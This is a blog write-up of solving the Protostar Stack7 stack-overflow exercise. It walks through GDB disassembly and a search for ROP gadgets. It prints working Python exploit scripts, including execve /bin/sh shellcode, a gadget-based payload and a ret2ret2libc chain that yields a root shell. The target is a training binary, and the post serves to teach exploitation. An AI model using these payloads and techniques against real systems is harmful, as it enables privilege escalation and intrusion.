---
layout: post
title: "B2B - Protostar, Stack7 (x86)"





---

## Introduction:

B2B is a series I have forced upon myself to make sure my basics are covered when it comes to exploitation. After passing my OSCE, I took a little break from exploitation to focus on a few work aspects, but now I am hungry for more lower level nonsense. 

This series will focus mainly on exploitation challenges which cover various techniques. First of which, is the stack overflow challenges within the Protostar image from "exploit education" found <a href="https://exploit.education/protostar/">here</a>. I gave myself two main rules to stick to whilst working through all these challenges.

1) Don't read the C source code for each challenge, only the hints section if required

2) Don't read other peoples write ups for these challenges unless I have already finished it and want to see other routes to further my interest

## Stack 7

The eighth and final stack challenge of Protostar is "Stack 7". I approached each challenge with a similar set of steps, so each post will likely follow a similar template(ish). Including initial running, inspecting the disassembly of the binary and some other specific steps in between before finally crafting a payload and owning the process.

Our initial use of the program identified the following:

```
$ ./stack7
input path please: test
got path test
```

The program simply appears to take a single input, presumably does something with it in the background and then prints some output based on the value that was specified. In this case, the binary took the string "test" as it's "input path", and printed "got path test". This is a different set of output compared to our previous challenges, which looks like we might have a new challenge on our hands.

Similar to the last challenge, I started this one off by looking at the hints. I knew it would be another stack based buffer overflow, however I was more curious to see what direction they had decided to go in since we have now done an overflow with our own shellcode.

The hints for this challenge are:

- Stack7 introduces return to .text to gain code execution.

- The metasploit tool “msfelfscan” can make searching for suitable instructions very easy, otherwise looking through objdump output will suffice.

From these hints alone, we can see this challenge will likely be similar to the previous challenge - which originally hinted at ret2libc and ROP. The disassembled binary will likely give us some return address restrictions again, possibly in the form of an "and"/"cmp" set of instructions again.

Similar to ret2libc, I won't go into too much detail about ROP and what it is. However, once again I will drop a few points below about ROP and why would want to use it:

- Uses precompiled code called 'gadget'
-  A gadget is the instructions that lie just before a 'ret' instruction
- Chaining gadgets give a flow of execution that is required. Each gadget will return into the next, giving us a decent amount of control providing the required code exists within the compiled binary
- ROP bypasses DEP/non-executable stack problems
- ROP actually makes me realise I don't know much about exploitation, but damn it feels good when a chain works!

Although we can already see some similarities with the previous challenge, let's continue as normal and use GDB to look further into the binary. Listing the functions we see the following:

```
(gdb) info functions
All defined functions:

File stack7/stack7.c:
char *getpath(void);
int main(int, char **);
```

Our functions look the same so far, let's check the disassembled code:

```
(gdb) disas main
Dump of assembler code for function main:
0x08048545 <main+0>:	push   ebp
0x08048546 <main+1>:	mov    ebp,esp
0x08048548 <main+3>:	and    esp,0xfffffff0
0x0804854b <main+6>:	call   0x80484c4 <getpath>
0x08048550 <main+11>:	mov    esp,ebp
0x08048552 <main+13>:	pop    ebp
0x08048553 <main+14>:	ret    
End of assembler dump.
```

Looking at this main() function, we can see that the main function only has one usage:

- It calls the getpath() function

Now let's disassemble getpath and see what this holds:

```
(gdb) disas getpath
Dump of assembler code for function getpath:
0x080484c4 <getpath+0>:	push   ebp
0x080484c5 <getpath+1>:	mov    ebp,esp
0x080484c7 <getpath+3>:	sub    esp,0x68
0x080484ca <getpath+6>:	mov    eax,0x8048620
0x080484cf <getpath+11>:	mov    DWORD PTR [esp],eax
0x080484d2 <getpath+14>:	call   0x80483e4 <printf@plt>
0x080484d7 <getpath+19>:	mov    eax,ds:0x8049780
0x080484dc <getpath+24>:	mov    DWORD PTR [esp],eax
0x080484df <getpath+27>:	call   0x80483d4 <fflush@plt>
0x080484e4 <getpath+32>:	lea    eax,[ebp-0x4c]
0x080484e7 <getpath+35>:	mov    DWORD PTR [esp],eax
0x080484ea <getpath+38>:	call   0x80483a4 <gets@plt>
0x080484ef <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4]
0x080484f2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
0x080484f5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
0x080484f8 <getpath+52>:	and    eax,0xb0000000
0x080484fd <getpath+57>:	cmp    eax,0xb0000000
0x08048502 <getpath+62>:	jne    0x8048524 <getpath+96>
0x08048504 <getpath+64>:	mov    eax,0x8048634
0x08048509 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
0x0804850c <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
0x08048510 <getpath+76>:	mov    DWORD PTR [esp],eax
0x08048513 <getpath+79>:	call   0x80483e4 <printf@plt>
0x08048518 <getpath+84>:	mov    DWORD PTR [esp],0x1
0x0804851f <getpath+91>:	call   0x80483c4 <_exit@plt>
0x08048524 <getpath+96>:	mov    eax,0x8048640
0x08048529 <getpath+101>:	lea    edx,[ebp-0x4c]
0x0804852c <getpath+104>:	mov    DWORD PTR [esp+0x4],edx
0x08048530 <getpath+108>:	mov    DWORD PTR [esp],eax
0x08048533 <getpath+111>:	call   0x80483e4 <printf@plt>
0x08048538 <getpath+116>:	lea    eax,[ebp-0x4c]
0x0804853b <getpath+119>:	mov    DWORD PTR [esp],eax
0x0804853e <getpath+122>:	call   0x80483f4 <strdup@plt>
0x08048543 <getpath+127>:	leave  
0x08048544 <getpath+128>:	ret    
End of assembler dump.
```

If we look back to the stack6 challenge, our inspection of getpath was:

- grow the stack by 0x68 bytes
- print is called, which likely prints the 'input path please:' string
- gets() is then used to take the user input <-- buffer overflow vulnerability
- an 'and' and 'cmp' instruction are done with EAX and the value '0xbf000000' value. This is likely the 'return address restriction' stated in the hints section
- the win/fail state is determined by a 'jne' instruction with the previously mentioned comparison. If are equal to the restricted value (after the 'and' calculation), we don't jump and exit() instead. If we don't equal that value, we jump over the exit() and carry on. This is likely our route for pwning it.

The only difference in this challenge, from an initial look is our 'and' and 'cmp' instructions. The restriction on our return address appears to be anything that starts with the the bit 'b', indicated by the 'and' calculation with the value "0xb0000000".

This restriction has likely been adapted to prevent us from using the same exploit as before, the ret2libc payload, which is we remember was located in the "0xbf000000" - "0xbfffffff" range. As a quick test, lets use this payload again here and see what happens.

stack6.py:

```
import struct
def build():
    libc_base = 0xb7e97000
    binsh_offset = 0x11f3bf

    string_addr = libc_base + binsh_offset
    system_addr = 0xb7ecffb0
    exit_addr = 0xb7ec60c0

    padding = 'A' * 80

    payload = padding
    payload += struct.pack("I", system_addr)
    payload += struct.pack("I", exit_addr)
    payload += struct.pack("I", string_addr)
    print payload

build()
```

Running this against our new vulnerable target fails but helps us identify a few things:

```
$ (python /tmp/stack6.py; cat) | ./stack7
input path please: bzzzt (0xb7ecffb0)
ls
$ 
```

The points to take away from this is:

- we can't ret2libc due to the 0xb0000000 address restriction
- we are vulnerable to a buffer overflow
- our offset to EIP appears to be the same
- we should have a rough skeleton for an exploit, stack7.py:

```
import struct
def build():
    padding = 'A' * 80
    addr = 0xdeadbeef

    payload = padding
    payload += struct.pack("I", addr)
    print payload

build()
```

The first thing we now need to do is figure out an attack plan on getting ROP to pop a shell. I haven't done much of this stuff before with x86, so I will be reading up on various blogs and non-related challenges to check out how people utilise gadgets to 'hopefully' pop a system shell. 

An initial assumption is the following:

- find a 'pop, ret' gadget
- return into the 'system' call in libc (is this allowed?)
- pass in the /bin/sh string into the system call

At this moment, I have no idea if this will work and I am not sure if this is a valid route to getting a shell in this case - however, let's have a look!

<i><about an hour later></i>

So after reading various blog posts and noob guides to computers, specifically "How to use Microsoft Word" and "Computers for Dummies" I realised my above assumption was... sort of far off? Returning to .text pretty much just allows me to:

- overflow and get EIP
- use a gadget to ret to .text via a specified value
- execute custom defined shellcode

Again, without too much reading. If I had a gadget that did a 'pop, ret' set of instructions. I could pop some junk off the stack, return to a location within my buffer overflow payload (.text section maybe?) and then finally land in the my shellcode.

First of all, let's check the ".text" section of the process:

```
objdump -s stack7

<snipped>
Contents of section .text:
8048410 31ed5e89 e183e4f0 50545268 60850408  1.^.....PTRh`...
8048420 68708504 08515668 45850408 e883ffff  hp...QVhE.......
<snipped>
```

The above tells us that our ".text" section starts at "0x08048410" which, luckily, does not land in our restricted memory address value of "0xb0000000" which is a good start! 

Now we want to try and find a gadget. Looking through the objdump of the binary, I can manually highlight a few:

```
80485f7:	5b                   	pop    %ebx
80485f8:	5d                   	pop    %ebp
80485f9:	c3                   	ret

80485c5:	5b                   	pop    %ebx
80485c6:	5e                   	pop    %esi
80485c7:	5f                   	pop    %edi
80485c8:	5d                   	pop    %ebp
80485c9:	c3                   	ret

8048563:	5d                   	pop    %ebp
8048564:	c3                   	ret
```

(there are more, but let's used one of these).

So, the above list of gadgets can either all be used in their full extent or they could be shrunk a bit. For example, I realistically only need a single pop and ret, so I could use any of the following address:

```
0x080485f8 -> pop EBP, ret 
0x080485c8 -> pop EBP, ret
0x08048563 -> pop EBP, ret
```

For our first attempt, let's use "0x080485f8" as our EIP overwrite. So far, our payload will need to be:

```
junk + pop/ret + (pop junk)
```

However, at this point, our gadget will literally pop a 4 byte piece of junk off the stack and then return to nothing as the address will be whatever is already in memory at that time.

Ideally, we want our payload to be:

```
junk + pop/ret + (pop junk) + return address + shellcode
```

Let's fill in these 2 new values, the first of which is a target return address that we require! Let's fire a tonne of values into the process and see where we land:

```
(gdb) x/30wx $esp
0xbffffca0:	0x43434343	0x44444444	0x45454545	0x46464646
0xbffffcb0:	0x47474747	0x48484848	0x49494949	0x4a4a4a4a
0xbffffcc0:	0x4b4b4b4b	0x4c4c4c4c	0x4d4d4d4d	0x4e4e4e4e
0xbffffcd0:	0x4f4f4f4f	0x50505050	0x51515151	0x52525252
0xbffffce0:	0x53535353	0xb7fd7f00	0x00000000	0x00000000
0xbffffcf0:	0xbffffd28	0x2a2f9303	0x006e8513	0x00000000
0xbffffd00:	0x00000000	0x00000000	0x00000001	0x08048410
0xbffffd10:	0x00000000	0xb7ff6210
```

Okay, so this is where I tripped a little bit. All our address start with the 'b' bit, which, is a banned value for our return address... but me being me, I'm pretty derpy, I missed the point that our return address has already been checked and signed as legitimate because of the above gadget "0x080485f8". In theory, if I now 'return' from the gadget into the stack, we should be allowed to perform some execution... right?

Focusing on the memory above, let's start to swap out some of the values manually to see where we should technically be able to return too. Remember, our 'planned' payload is the following:

```
junk + pop/ret + (pop junk) + return address + shellcode
```

A quick breakdown of the values swapped in the stack can be seen here:

- 43434343 will be our "pop junk", used by our pop/ret gadget
- 44444444 will be our return address, this could be somewhere in the above stack dump
- 45454545 could be the start of our shellcode, meaning 44444444 would be the address of this point in memory in this case

Let's try the following as our payload. Note, we have added our gadget, the required junk, a return address and our own shellcode:

```
import struct
def build():
    padding = 'A' * 80
    pop_ret_gadget = 0x080485f8
    pop_junk = "BBBB"
    ret_addr = 0xbffffcd0
    nop_sled = "\x90" * 100
    shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

    payload = padding
    payload += struct.pack("I", pop_ret_gadget)
    payload += pop_junk
    payload += struct.pack("I", ret_addr)
    payload += nop_sled
    payload += shellcode
    print payload

build()
```

Amazingly, look what happened in GDB!!

```
$ python /tmp/stack7.py > /tmp/stack7
$ gdb stack7
GNU gdb (GDB) 7.0.1-debian
Copyright (C) 2009 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i486-linux-gnu".
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>...
Reading symbols from /opt/protostar/bin/stack7...done.
(gdb) r < /tmp/stack7
Starting program: /opt/protostar/bin/stack7 < /tmp/stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA�BBBB��������������������������������������������1�Ph//shh/bin��PS��

Executing new program: /bin/dash

Program exited normally.
```

We can see that the payload worked, and we were able to ROP  our way into a "/bin/dash", which naturally quit our instantly. Let's try it outside of GDB and see what happens:

```
$ python /tmp/stack7.py | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA�BBBB��������������������������������������������1�Ph//shh/bin��PS��

Illegal instruction
```

... 0____o ...

Well, could this be padding like before? Let's extend our NOP sled a bit, and offset our return address too just incase the offsets in the debugger were breaking our payload.

<i>A change of plan</i>

After embarrassingly failing the above, I moved on with my life and wanted to try and get my original assumption working, because in theory... I should be able to re-purpose my ret2libc exploit from stack6. But instead of returning to libc, I initially return into the ret2libc payload... ultimately, my exploit will digivolve (best show) into a ret2ret2libc attack... right?

My attempted payload for this was the original stack6.py script + a new return address as commented below:

```
import struct
def build():
    libc_base = 0xb7e97000
    binsh_offset = 0x11f3bf

    ret_addr = 0x08048544 # getpath() ret
    string_addr = libc_base + binsh_offset
    system_addr = 0xb7ecffb0
    exit_addr = 0xb7ec60c0

    padding = 'A' * 80

    payload = padding
    payload += struct.pack("I", ret_addr)
    payload += struct.pack("I", system_addr)
    payload += struct.pack("I", exit_addr)
    payload += struct.pack("I", string_addr)
    print payload

build()
```

Well, okay. The biggest thing I learnt here... is I need to follow my gut instinct and not second guess myself. Check out the following output:

```
$ (python /tmp/stack7b.py; cat) | ./stack7
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAAAAAAAAAD����`췿c��
whoami
root
id
uid=1001(user) gid=1001(user) euid=0(root) groups=0(root),1001(user)
```

I was literally able to take my ret2libc payload, change the EIP overwrite to be a 'ret' gadget and just return into my original payload, bypassing the tighter restriction and popping my root shell before cleanly exiting with the exit() function.

That was awesome! If you have followed me along this journey of the Protostar stack challenges, I thank you. I hope you learnt something and enjoyed my derps along the way! Next up, String Format vulnerabilities :) 